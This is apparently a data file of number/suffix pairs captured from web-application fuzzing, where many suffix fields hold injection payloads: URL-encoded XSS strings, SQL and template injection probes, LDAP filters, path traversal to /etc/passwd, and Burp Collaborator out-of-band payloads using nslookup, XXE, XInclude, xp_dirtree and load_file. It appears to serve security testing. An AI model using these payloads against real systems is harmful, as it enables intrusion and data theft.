Number;Suffix;
1;NULL;
938;;
22;a;
938;;
28;NULL;
17;NULL;
18;;
25;NULL;
938;#%20The%20next%20line%20may%20appear%20to%20be%20blank%20or%20mojibake%20in%20some%20viewers%2e;
6;;
68;NULL;
33;;
938;;
938;;
938;;
39;NULL;
1;NULL;
107;A;
501;NULL;
113;;
938;;
20;;
938;;
71;NULL;
75;;
22;A;
75;;
15;;
71;NULL;
938;;
3;NULL;
9;NULL;
39;NULL;
938;;
8;NULL;
9;NULL;
17;NULL;
27;;
938;;
23;;
938;;
3;NULL;
75;' and 4782=4782'-- ;
938;;
1;;
26;A;
4;NULL;
1;NULL;
71;NULL;
22;NULL;
200;;
938;;
13;NULL;
29;;
938;울란바토르;
22;NULL;
75;;
938;;
1;NULL;
39;NULL;
4;;
938;;
938;%22%60'%3e%3cscript%3e%5cxE2%5cx80%5cx89javascript%3aalert(1)%3c%2fscript%3e;
26;A;
2;;
22;NULL;
128;;
39;NULL;
938;;
164;C;
179;NULL;
25;;
7;A;
80;NULL;
17;NULL;
61;;
j0ey3<%= 806*367 %>m2e28;;
938;;
3;NULL;
22;NULL;
938;;
8;NULL;
15;;
47;;
ypks9{{218*351}}jeuh3;;
1;;
88;C;
938;;
938;;
938;;
1;NULL;
3;NULL;
938;;
938;;
938;;
68;NULL;
71;NULL;
68;NULL;
938;;
2;NULL;
1;;
938;;
501;NULL;
938;;
71;NULL;
501;NULL;
938;;
938;;
938;;
938;;
80;NULL;
75;;
71;NULL;
113;;
327;NULL;
938;;
73;;
938;;
938;;
1;A;
3;NULL;
938;;
938;사회과학원%20어학연구소;
9;NULL;
938;LPT2;
1;NULL;
88;A;
938;'%22';
1;NULL;
4;NULL;
39;NULL;
25;NULL;
25;NULL;
25;NULL;
938;;
6;NULL;
938;#;
938;;
10;;
4;NULL;
22;-4;
938;;
1;NULL;
938;;
1;;
938;[%7b%221%22%3a%220%22%7d,1];
212;NULL;
938;;
938;;
938;;
19;NULL;
2;NULL;
938;;
26;A;
247;NULL;
938;;
1;NULL;
2;NULL;
7;A;
938;;
75;;
80;NULL;
1;;
15;A;
4;;
1;;
938;;
938;;
39;NULL;
25;;
83;NULL;
14;;
17;NULL;
12;;
4;;
7;A;
25;;
4;;
938;0%2e0%2e0;
9;NULL;
18;;
26;A;
75;"(select extractvalue(xmltype('<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE root [ <!ENTITY % xhsdm SYSTEM ""http://bcrlm7q9u0p7gwljbmuunw2bv21wpndq1ioacz.burpcollab'||'orator.net/"">%xhsdm;]>'),'/l') from dual)";
17;NULL;
200;;
10;;
4;;
14;NULL;
26;A;
68;NULL;
140;;
3;;
938;;
80;NULL;
19;NULL;
71;NULL;
10;NULL;
938;;
75;;
1;NULL;
938;;
64;;
19;;
2;NULL;
75;;
1;NULL;
938;%3cimg%20src%5cx12%3dx%20onerror%3d%22javascript%3aalert(1)%22%3e;
1;;
938;;
22;NULL;
14;;
17;NULL;
39;NULL;
71;NULL;
938;;
1;;
15;;
938;;
938;;
1;NULL;
71;NULL;
19;NULL;
938;;
938;;
1;;
1;NULL;
75;;
34;a;
nkbxujyl2cxjo8tvjy26v8an3e98xzlr9jwakz.burpcollaborator.net;;
1;NULL;
1;NULL;
1;NULL;
938;;
10;NULL;
39;NULL;
938;;
71;NULL;
83;NULL;
1;NULL;
938;;
39;NULL;
41;NULL;
1;;
938;;
938;;
1;NULL;
45;NULL;
20;NULL;
938;;
938;;
938;;
1;;
17;NULL;
938;;
938;;
1;NULL;
938;;
25;NULL;
71;NULL;
8;NULL;
71;NULL;
938;;
120;a;
75;;
938;;
75;;
501;NULL;
2;NULL;
150;;
938;#;Scunthorpe%20Problem
210;;
17;NULL;
17;NULL;
22;B;
938;%3ca%20href%3d%22%5cx15javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
20;NULL;
938;;
24;NULL;
1;NULL;
75;nslookup -q=cname 053afwjynpiw9le84bnjglv0orulic659t1gt4i.burpcollaborator.net.&;
3;NULL;
938;;
938;#;
75;;
6;;
2;NULL;
107;A;
35;;
19;NULL;
19;NULL;
68;NULL;
8;;
3;NULL;
938;NULL;
75;;
39;NULL;
26;A;
80;NULL;
938;;
10;;
7;A;
68;NULL;
938;;
212;NULL;
938;;
13;;
68;NULL;
71;NULL;
17;NULL;
938;;
25;NULL;
938;;
8;NULL;
25;NULL;
938;;
75;;
3;NULL;
938;;
1;NULL;
71;;
938;;
5;;
938;;
938;;
107;A;
938;;
47;NULL;
20;;
26;A;
75;;
12;;
71;NULL;
1;;
938;expression;
34;a;
75;;
938;;
938;;
34;a;
8;;
938;;
1;NULL;
938;;
1;NULL;
75;;
26;A;
34;a;
13;NULL;
3;NULL;
17;NULL;
T8grJq7LR9KGjE7741gXMqPny8xsLvsyBiwIFwoF7rg=;;
34;a;
75;' and '4628'='4633;
938;;
39;NULL;
1;NULL;
200;NULL;
71;NULL;
11;;
65;NULL;
938;;
42;NULL;
116;NULL;
80;NULL;
39;NULL;
938;;
17;NULL;
75;;
1;;
24;3;
501;NULL;
938;%7b%22Kind%22%3a%22null%22,%22A%22%3a%22B%22%7d;
90;A;
75;;
15;;
1;;
47;;
"75""";;
200;NULL;
75;;
3;;
938;;
938;;
75;;
1;NULL;
38;;
938;;
75;yhjbi__${677*242}__sfnem;
938;;
22;NULL;
20;NULL;
938;;
75;file:///c:/windows/win.ini;
19;NULL;
1;NULL;
1;A;
5;;
938;;
8;NULL;
938;0%2e0%2f0%2e0;
1;NULL;
938;%22%5cx00%22;
501;NULL;
75' and '3715'='3715;;
2;NULL;
17;;
75;;
BCC:2ilcsyw00rvymnrahd0ltn821t7nvej6cu4hw5l@burpcollaborator.net;;
xiy: o;;
3;;
31;NULL;
938;'%20OR%20'1'%3d'1;
34;a;
71;NULL;
75;;
83;NULL;
75;;
75;;
1;NULL;
1;NULL;
938;;
938;#;Strings%20which%20contain%20bold%2fitalic%2fetc%2e%20versions%20of%20normal%20characters
19;NULL;
17;NULL;
83;C;
39;NULL;
938;;
75;;
3;NULL;
24;NULL;
18;;
1;X;
121;;
16;;
938;;
938;;
938;;
1;NULL;
1;NULL;
4;NULL;
91;;
247;NULL;
938;;
17;NULL;
39;NULL;
938;;
1;NULL;
17;NULL;
150;NULL;
938;;
80;NULL;
39;NULL;
938;;
10;;
71;NULL;
2;;
1;;
22;B;
938;;
25;NULL;
243;2;
1;NULL;
39;NULL;
4;;
3;NULL;
938;1,000%2e00;
7;A;
24;NULL;
75;;
0xabad1dea;;
3;NULL;
68;NULL;
75;;
1;;
247;NULL;
80;NULL;
12;NULL;
212;NULL;
28;;
1;;
80;NULL;
7;NULL;
34;a;
25;NULL;
75;;
17;NULL;
9;NULL;
39;NULL;
938;;
1;NULL;
7;A;
6;;
1;NULL;
4;NULL;
5;NULL;
12;;
45;NULL;
4;NULL;
17;NULL;
157;;
501;NULL;
26;A;
938;%3cIMG%20SRC%3djavascript%3aalert(String%2efromCharCode(88,83,83))%3e;
39;NULL;
938;;
3;NULL;
9;NULL;
7;A;
938;1%3bDROP%20TABLE%20users;
1;;
19;NULL;
8;;
105;;
71;NULL;
26;A;
1;;
938;;
19;NULL;
1;;
71;NULL;
2;;
12;NULL;
501;NULL;
938;;
26;A;
75;;
938;;
938;;
1;NULL;
22;NULL;
938;;
938;;
230;;
10;NULL;
24;NULL;
3;NULL;
45;NULL;
2;A;
yDdknM5D8nKROOcswxUgcFesglmaWb5ydlpHfyLRSlQ=;;
938;;
938;;
71;NULL;
938;;
39;NULL;
3;NULL;
75;;
71;NULL;
1;NULL;
1;;
29;a;
80;NULL;
938;$1%2e00;
938;￾;
7;A;
3;NULL;
2;NULL;
938;;
16;;
150;NULL;
2;;
7;NULL;
938;;
25;NULL;
1;;
938;;
80;NULL;
938;;
1;NULL;
938;;
4;NULL;
75;;
3;NULL;
15;;
71;NULL;
938;-1#IND;
938;;
75;;
1;NULL;
938;;
2;NULL;
11;;
75;;
71;NULL;
1;NULL;
938;;
75;;
3;NULL;
938;;
1;;
4;NULL;
75;"<des xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""http://vba5lrpttkorfgk3a6temg1vum0go7c800nsbh.burpcollaborator.net/foo""/></des>";
938;;
75;./;
938;;
80;NULL;
1;;
15;;
1;NULL;
938;%3ca%20href%3d%22%5cx1Cjavascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
24;NULL;
938;;
116;;
2;NULL;
938;;
938;;
938;;
188;;
7524908024 or 9430=09430;;
938;%3c%20%2f%20script%20%3e%3c%20script%20%3ealert(123)%3c%20%2f%20script%20%3e;
3;NULL;
75;;
75;;
128;;
34;a;
26;A;
132;;
3;NULL;
7;;
1;NULL;
938;;
3;NULL;
4;;
10;;
938;;
45;D;
4;NULL;
2;NULL;
121;;
2;NULL;
938;%7b%7d;
13;NULL;
13;;
938;;
"75);declare @q varchar(99);set @q='\\086aiwmyqplwclh87bqjjly0rrxllc931rtek29.burpcollab'+'orator.net\tjo'; exec master.dbo.xp_dirtree @q;-- ";;
9;NULL;
75;;
6;NULL;
1;;
25;NULL;
71;NULL;
9uCh4qxBlFqap/+KiqoM68EqO8yYGpKa1c+BCgkOEa4=;;
2;NULL;
9;NULL;
4;;
8;NULL;
71;NULL;
938;;
938;;
1;NULL;
gik6e{{.}}k2yqu{{..}}jof03;;
75;25444930' or 6868=6868-- ;
26;A;
12;;
4;NULL;
75;;
7;;
20;NULL;
"75'""`0&nslookup -q=cname e7mohalcp3kabzgm6ppxizxeq5wzkq8nwfj67v.burpcollaborator.net.&`'";;
1;NULL;
938;#%20and%20U%2b200B%20(ZERO%20WIDTH%20SPACE),%20which%20are%20in%20the%20C%20categories%20but%20are%20often;
4;;
83;NULL;
25;NULL;
20;;
17;NULL;
9;NULL;
938;;
83;NULL;
1;NULL;
57;;
5;NULL;
938;;
80;NULL;
2;NULL;
34;a;
75;;
938;;
938;;
75;;
11;;
14;;
41;;
80;NULL;
938;;
68;NULL;
39;NULL;
71;NULL;
938;;
184;NULL;
1;NULL;
34;NULL;
938;;
938;;
21;;
938;%3cIMG%20SRC%3d%22jav%20%20%20ascript%3aalert('XSS')%3b%22%3e;
31;;
19;NULL;
938;;
938;%60%22'%3e%3cimg%20src%3dxxx%3ax%20%5cx0Conerror%3djavascript%3aalert(1)%3e;
247;NULL;
68;NULL;
5;;
1;NULL;
4;NULL;
938;;
309;;
938;;
25;NULL;
3;NULL;
24;NULL;
8;;
20;;
80;NULL;
938;;
938;;
4;;
99;B;
4;NULL;
17;NULL;
75;././;
3;;
4;;
8;NULL;
22;A;
68;NULL;
1;NULL;
9;NULL;
19;NULL;
23;C;
150;;
75;;
1;NULL;
99;;
4;NULL;
22;NULL;
71;NULL;
75;;
1;NULL;
938;;
34;a;
80;NULL;
17;NULL;
68;NULL;
938;;
80;NULL;
1;NULL;
1,00E+02;;
71;NULL;
4oabwyi25c)(!(!(!(objectClass=*)));;
4;NULL;
1;NULL;
3;;
65;;
75;;
24;NULL;
71;NULL;
938;ABC%3cdiv%20style%3d%22x%3a%5cx0Dexpression(javascript%3aalert(1)%22%3eDEF;
7;A;
80;NULL;
9;NULL;
3;NULL;
501;NULL;
5;a;
26;A;
75;18489679' or '5307'='5307;
39;NULL;
71;NULL;
938;;
68;NULL;
25;NULL;
1;NULL;
21;;
938;shitake%20mushrooms;
938;ABC%3cdiv%20style%3d%22x%3a%5cx0Aexpression(javascript%3aalert(1)%22%3eDEF;
2;NULL;
39;NULL;
938;%3cscript%3ealert(123)%3c%2fscript%3e;
25;NULL;
938;̦H̬̤̗̤͝e͜%20̜̥̝̻͍̟́w̕h̖̯͓o̝͙̖͎̱̮%20҉̺̙̞̟͈W̷̼̭a̺̪͍į͈͕̭͙̯̜t̶̼̮s̘͙͖̕%20̠̫̠B̻͍͙͉̳ͅe̵h̵̬͇̫͙i̹͓̳̳̮͎̫̕n͟d̴̪̜̖%20̰͉̩͇͙̲͞ͅT͖̼͓̪͢h͏͓̮̻e̬̝̟ͅ%20̤̹̝W͙̞̝͔͇͝ͅa͏͓͔̹̼̣l̴͔̰̤̟͔ḽ̫%2e͕;
1;NULL;
2;NULL;
75;;
17;NULL;
247;NULL;
25;NULL;
38;de Heun 38;
938;1%2e000%2e000,00;
938;;
247;NULL;
938;̡͓̞ͅI̗̘̦͝n͇͇͙v̮̫ok̲̫̙͈i̖͙̭̹̠̞n̡̻̮̣̺g̲͈͙̭͙̬͎%20̰t͔̦h̞̲e̢̤%20͍̬̲͖f̴̘͕̣è͖ẹ̥̩l͖͔͚i͓͚̦͠n͖͍̗͓̳̮g͍%20̨o͚̪͡f̘̣̬%20̖̘͖̟͙̮c҉͔̫͖͓͇͖ͅh̵̤̣͚͔á̗̼͕ͅo̼̣̥s̱͈̺̖̦̻͢%2e̛̖̞̠̫̰;
200;;
39;NULL;
41;;
39;NULL;
1;NULL;
17;NULL;
116;;
938;;
39;NULL;
938;;
150;NULL;
75;81104504' or '9938'='9938;
938;;
7;A;
0xffffffffffffffff;;
938;;
75;;
938;;
75;;
68;NULL;
9;;
17;NULL;
19;NULL;
938;;
19;NULL;
938;#;
1;NULL;
8;NULL;
15;;
26;A;
2;;
938;#;Server%20Code%20Injection
938;;
8;NULL;
1;NULL;
26;A;
4;;
938;;
4;NULL;
3;NULL;
24;NULL;
39;NULL;
3;;
22;NULL;
9;NULL;
938;%3cIMG%20SRC%3d%22%20%26#14%3b%20%20javascript%3aalert('XSS')%3b%22%3e;
938;;
247;NULL;
179;NULL;
938;;
80;NULL;
938;Ṱ̺̺̕o͞%20̷i̲̬͇̪͙n̝̗͕v̟̜̘̦͟o̶̙̰̠kè͚̮̺̪̹̱̤%20̖t̝͕̳̣̻̪͞h̼͓̲̦̳̘̲e͇̣̰̦̬͎%20̢̼̻̱̘h͚͎͙̜̣̲ͅi̦̲̣̰̤v̻͍e̺̭̳̪̰-m̢iͅn̖̺̞̲̯̰d̵̼̟͙̩̼̘̳%20̞̥̱̳̭r̛̗̘e͙p͠r̼̞̻̭̗e̺̠̣͟s̘͇̳͍̝͉e͉̥̯̞̲͚̬͜ǹ̬͎͎̟̖͇̤t͍̬̤͓̼̭͘ͅi̪̱n͠g̴͉%20͏͉ͅc̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲%2ę̹͈̣;
938;;
18;;
75 and 4088=40880;;
1;;
52;;
2;NULL;
7;A;
71;NULL;
99;;
39;NULL;
1;;
83;NULL;
9;NULL;
1;NULL;
33;;
4;NULL;
7;A;
68;NULL;
938;;
45;NULL;
111;;
938;;
938;%22Date(1335205592410)%22;
17;NULL;
17;NULL;
39;NULL;
247;NULL;
1;NULL;
4;NULL;
83;NULL;
80;NULL;
26;A;
45;NULL;
2;NULL;
71;NULL;
8;NULL;
938;;
938;;
75;;
5;;
938;;
1,23457E+38;;
938;;
16;;
71;NULL;
75;;
13;;
71;NULL;
5;;
75;/./address;
71;NULL;
36;;
63;;
45;D;
68;NULL;
4;NULL;
1;NULL;
938;;
75;&ping -n 21 127.0.0.1&;
247;NULL;
938;;
3;NULL;
1;;
25;NULL;
10;NULL;
12;NULL;
938;0;
938;#;Unicode%20font
3;NULL;
9;b;
75;"javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/zkn9uvyx2oxvokt7ja2ivkaz3q9kxbl3cr4ew2lX;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>";
3;;
2;NULL;
938;;
1;NULL;
1;NULL;
26;A;
938;;
25;NULL;
50;;
9;NULL;
39;NULL;
112;;
15;;
39;NULL;
19;NULL;
31;;
938;;
116;;
938;;
80;NULL;
9;;
20;NULL;
938;;
938;;
39;NULL;
938;;
26;A;
8;;
938;;
9;;
9;NULL;
35;NULL;
938;#;Special%20Characters
24;NULL;
75;;
25;NULL;
75;;
1;NULL;
45;NULL;
938;;
9;;
938;;
938;;
25;NULL;
938;#;
938;;
37;NULL;
938;0;
1;NULL;
6;NULL;
111;;
4;NULL;
17;NULL;
75;"}}f4dyv'/""<xrns4";
938;#;
938;%3cplaintext%3e;
14;;
938;🇺🇸🇷🇺🇸🇦🇫🇦🇲;
14;;
24;NULL;
247;NULL;
938;;
83;NULL;
80;;
938;;
938;;
9;NULL;
938;;
938;;
938;%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00;
39;NULL;
25;NULL;
7;;
39;NULL;
1;NULL;
71;NULL;
1;NULL;
1;;
3;NULL;
71;NULL;
0;;
938;;
1;NULL;
1;NULL;
4;;
938;;
938;#;Human%20injection
24;NULL;
938;;
25;NULL;
0;;
938;;
938;;
3;NULL;
529;;
938;;
39;NULL;
200;;
22;a;
26;A;
51;A-3;
938;;
9;;
938;#%20treated%20as%20whitespace%20in%20some%20contexts%2e;
19;NULL;
1;NULL;
10;;
14;;
3;;
938;;
938;Roses%20are%20[0%3b31mred[0m,%20violets%20are%20[0%3b34mblue%2e%20Hope%20you%20enjoy%20terminal%20hue;
938;%22%60'%3e%3cscript%3e%5cxE2%5cx80%5cx81javascript%3aalert(1)%3c%2fscript%3e;
938;;
938;%3cIMG%20onmouseover%3d%22alert('xxs')%22%3e;
938;%7b%22_id%22%3a%221%22%7d;
501;NULL;
68;NULL;
26;A;
7;A;
31;;
938;%3ca%20href%3d%22%5cx0Fjavascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
938;;
938;;
71;NULL;
938;;
1;NULL;
76;;
1;NULL;
75;;
938;;
19;;
1;NULL;
19;NULL;
938;;
938;;
25;NULL;
75;;
19;NULL;
938;;
200;;
26;A;
22;B;
22;NULL;
9;;
6;;
39;NULL;
938;;
938;;
17;NULL;
17;NULL;
75'+(select load_file('\\\\oqiy0k4m8d3ku9zwpz8719go9ff930rrufm2dq2.burpcollaborator.net\\pkb'))+';;
5;NULL;
938;#;Strings%20which%20can%20call%20system%20commands%20within%20Ruby%2fRails%20applications
39;NULL;
71;NULL;
6n1wvtvdhk\\l1phd5rous;;
107;A;
10;;
5;;
2;NULL;
1;NULL;
7;A;
39;NULL;
8;NULL;
116;;
39;NULL;
75;/etc/passwd;
16;;
938;;
22;A;
34;a;
25;NULL;
80;NULL;
938;;
15;;
938;;
12;NULL;
15;;
938;#;Known%20CVEs%20and%20Vulnerabilities
75;;
938;;
5;;
4;NULL;
22;;
4;NULL;
75;;
938;;
5;a;
938;జ్ఞ‌ా;
68;NULL;
21;NULL;
938;;
*)(!(!(objectClass=*));;
938;;
161;;
39;NULL;
938;;
